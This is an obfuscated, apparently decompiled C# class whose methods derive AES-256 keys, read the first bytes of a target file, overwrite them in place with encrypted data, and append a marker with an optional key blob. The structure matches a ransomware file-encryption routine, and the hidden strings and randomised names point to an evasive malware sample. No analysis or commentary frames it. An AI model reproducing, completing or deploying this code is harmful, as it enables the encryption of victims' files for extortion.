using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace RshJmeUGgeNp;

public static class NvljFLVXzJtPi
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] mByWvcKSwdsBhbS(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = WwYuKQhOfpvMx(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes WwYuKQhOfpvMx(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] gMAlEqhWoafK(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (RvpNXHMAnDGj.aCercHDJqlth == getString_0(107397016))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (RvpNXHMAnDGj.ypofoMoLMAIop)
			{
				try
				{
					File.AppendAllText(RvpNXHMAnDGj.xXiTPiYVwRAzXZ, getString_0(107390617) + string_0 + getString_0(107402621) + ex.Message + getString_0(107396325));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void FHeidwHVLLD(string DXMwgOcsXZpsKTv, byte[] urmCgduHwRwh, byte[] syxKqcQzfEI = null)
	{
		try
		{
			byte[] array = null;
			if (RvpNXHMAnDGj.aCercHDJqlth == getString_0(107397016))
			{
				array = (RvpNXHMAnDGj.tcfvsNKQegWI ? Encoding.ASCII.GetBytes(RvpNXHMAnDGj.SkTISxbocVBV(RvpNXHMAnDGj.JxyncXrFSAtEALu) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402563)) + Convert.ToString(RvpNXHMAnDGj.GYVbvtfqJjgcv) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402563))) : Encoding.ASCII.GetBytes(RvpNXHMAnDGj.SkTISxbocVBV(RvpNXHMAnDGj.JxyncXrFSAtEALu) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402604)) + Convert.ToString(RvpNXHMAnDGj.GYVbvtfqJjgcv) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402604))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(DXMwgOcsXZpsKTv, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(urmCgduHwRwh, 0, urmCgduHwRwh.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(DXMwgOcsXZpsKTv, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!RvpNXHMAnDGj.tcfvsNKQegWI)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(syxKqcQzfEI, 0, syxKqcQzfEI.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (RvpNXHMAnDGj.tcfvsNKQegWI ? Encoding.ASCII.GetBytes(RvpNXHMAnDGj.SkTISxbocVBV(RvpNXHMAnDGj.JxyncXrFSAtEALu) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402563)) + Convert.ToString(RvpNXHMAnDGj.GYVbvtfqJjgcv) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402563))) : Encoding.ASCII.GetBytes(RvpNXHMAnDGj.SkTISxbocVBV(RvpNXHMAnDGj.JxyncXrFSAtEALu) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402604)) + Convert.ToString(RvpNXHMAnDGj.GYVbvtfqJjgcv) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402604))));
			FileStream fileStream2 = new FileStream(DXMwgOcsXZpsKTv, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(urmCgduHwRwh, 0, urmCgduHwRwh.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(DXMwgOcsXZpsKTv, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!RvpNXHMAnDGj.tcfvsNKQegWI)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(syxKqcQzfEI, 0, syxKqcQzfEI.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (RvpNXHMAnDGj.ypofoMoLMAIop)
			{
				try
				{
					File.AppendAllText(RvpNXHMAnDGj.xXiTPiYVwRAzXZ, getString_0(107390617) + DXMwgOcsXZpsKTv + getString_0(107402586) + ex.Message + getString_0(107396325));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (RvpNXHMAnDGj.tcfvsNKQegWI ? Encoding.ASCII.GetBytes(RvpNXHMAnDGj.SkTISxbocVBV(RvpNXHMAnDGj.JxyncXrFSAtEALu) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402563)) + Convert.ToString(RvpNXHMAnDGj.GYVbvtfqJjgcv) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402563))) : Encoding.ASCII.GetBytes(RvpNXHMAnDGj.SkTISxbocVBV(RvpNXHMAnDGj.JxyncXrFSAtEALu) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402604)) + Convert.ToString(RvpNXHMAnDGj.GYVbvtfqJjgcv) + RvpNXHMAnDGj.SkTISxbocVBV(getString_0(107402604))));
			FileStream fileStream4 = new FileStream(DXMwgOcsXZpsKTv, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(urmCgduHwRwh, 0, urmCgduHwRwh.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(DXMwgOcsXZpsKTv, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!RvpNXHMAnDGj.tcfvsNKQegWI)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(syxKqcQzfEI, 0, syxKqcQzfEI.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static NvljFLVXzJtPi()
	{
		Strings.CreateGetStringDelegate(typeof(NvljFLVXzJtPi));
	}
}
